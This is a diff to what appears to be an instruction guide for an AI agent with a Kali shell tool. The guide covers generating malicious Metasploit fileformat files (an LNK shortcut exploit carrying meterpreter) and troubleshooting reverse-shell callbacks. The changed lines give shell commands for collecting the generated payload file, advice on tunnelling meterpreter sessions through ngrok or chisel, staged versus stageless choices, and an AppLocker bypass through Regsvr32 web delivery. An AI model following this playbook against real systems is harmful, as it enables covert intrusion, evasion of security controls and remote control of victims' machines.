@@ -151,10 +151,10 @@ use exploit/windows/fileformat/lnk_shortcut_ftype_append; set PAYLOAD windows/me
 ```
 
 **CRITICAL: Fileformat module output location:**
-All fileformat modules save output to `/root/.msf4/local/<FILENAME>`.
-After generation, ALWAYS copy to `/tmp/` for easier access:
+All fileformat modules save output to `~/.msf4/local/<FILENAME>` of the user running msfconsole
+(`/root/.msf4/local/` only when it runs as root). Resolve the real path before copying:
 ```
-kali_shell: "cp /root/.msf4/local/<filename> /tmp/ && ls -la /tmp/<filename>"
+kali_shell: "F=$(ls -t ~/.msf4/local/ | head -1); cp ~/.msf4/local/$F /tmp/ && ls -la /tmp/$F"
 ```
 
 ---
@@ -255,9 +255,9 @@ Report the one-liner command (Method C) or URL (Method D) to the user.
 |---------|-----|
 | msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
 | Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
-| Handler dies immediately | Check LHOST is correct. If using ngrok or chisel, ensure `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort 4444` are set. |
+| Handler dies immediately | Check LHOST is correct. If using ngrok or chisel, set `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort <local tunnel port>` (the port your tunnel listens on = your LPORT, not necessarily 4444). |
 | Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok or chisel, verify you are using a STAGELESS payload (underscore `_` not slash `/`). If using chisel, also check `/var/log/chisel.log` in kali-sandbox. |
-| Session opens then dies instantly | You are using a STAGED payload through a tunnel (ngrok or chisel) — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). Staged payloads only work with direct connections. |
+| Session opens then dies instantly | You are using a STAGED payload through a tunnel (ngrok or chisel) — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). Staged payloads typically fail through TCP-forwarding tunnels (ngrok/chisel) but work over direct connections and full L3 tunnels (VPN). |
 | "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
 | Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
 | Web delivery: no session (ngrok) | Web delivery CANNOT work through ngrok (needs TWO ports). Switch to Method A or use chisel tunnel instead. |
